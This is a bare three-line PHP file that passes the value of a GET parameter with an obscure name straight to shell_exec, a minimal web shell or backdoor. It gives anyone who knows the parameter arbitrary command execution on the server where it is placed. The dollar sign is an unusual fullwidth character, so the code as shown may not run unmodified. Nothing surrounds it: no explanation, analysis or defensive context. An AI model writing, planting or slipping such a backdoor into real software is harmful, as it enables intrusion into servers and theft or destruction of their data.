<?php
shell_exec(＄_GET['LD2320fl']);
?>
